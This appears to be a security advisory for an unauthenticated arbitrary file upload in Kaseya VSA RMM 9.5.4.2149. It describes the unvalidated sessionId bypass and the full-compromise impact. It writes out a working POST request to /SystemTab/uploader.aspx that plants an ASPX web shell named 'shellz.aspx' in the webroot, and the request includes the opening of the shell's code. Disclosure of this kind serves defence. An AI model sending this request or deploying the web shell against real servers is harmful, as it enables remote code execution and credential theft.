summary: 'An attacker can upload files with the privilege of the Web Server process for Kaseya
  VSA Unified Remote Monitoring & Management (RMM) 9.5.4.2149 and subsequently use these files
  to execute asp commands The api /SystemTab/uploader.aspx is vulnerable to an unauthenticated
  arbitrary file upload leading to RCE. An attacker can upload files with the privilege of the
  Web Server process and subsequently use these files to execute asp commands. Detailed description
  --- Given the following request: ``` POST /SystemTab/uploader.aspx?Filename=shellz.aspx&PathData=C%3A%5CKaseya%5CWebPages%5C&__RequestValidationToken=ac1906a5-d511-47e3-8500-47cc4b0ec219&qqfile=shellz.aspx
  HTTP/1.1 Host: 192.168.1.194 Cookie: sessionId=92812726; %5F%5FRequestValidationToken=ac1906a5%2Dd511%2D47e3%2D8500%2D47cc4b0ec219
  Content-Length: 12 <%@ Page Language="C#" Debug="true" validateRequest="false" %> <%@ Import
  namespace="System.Web.UI.WebControls" %> <%@ Import namespace="System.Diagnostics" %> <%@
  Import namespace="System.IO" %> <%@ Import namespace="System" %> <%@ Import namespace="System.Data"

  password = "pass"; // The password ( pass ) private const string style = "dark"; // The style
  ( light / dark ) protected void Page_Load(object sender, EventArgs e) { //this.Remote(password);
  this.Login(password); this.Style(); this.ServerInfo(); <snip> ``` The attacker can control
  the name of the file written via the qqfile parameter and the location of the file written
  via the PathData parameter. Even though the call requires that a sessionId cookie is passed
  we have determined that the sessionId is not actually validated and any numeric value is accepted
  as valid. Security issues discovered --- * a sessionId cookie is required by /SystemTab/uploader.aspx,
  but is not actually validated, allowing an attacker to bypass authentication * /SystemTab/uploader.aspx
  allows an attacker to create a file with arbitrary content in any place the webserver has
  write access * The web server process has write access to the webroot where the attacker can
  execute it by requesting the URL of the newly created file. Impact --- This arbitrary file
  upload allows an attacker to place files of his own choosing on any location on the hard drive
  of the server the webserver process has access to, including (but not limited to) the webroot.
  If the attacker uploads files with code to the webroot (e.g. aspx code) he can then execute
  this code in the context of the webserver to breach either the integrity, confidentiality,
  or availability of the system or to steal credentials of other users. In other words, this
  can lead to a full system compromise.'
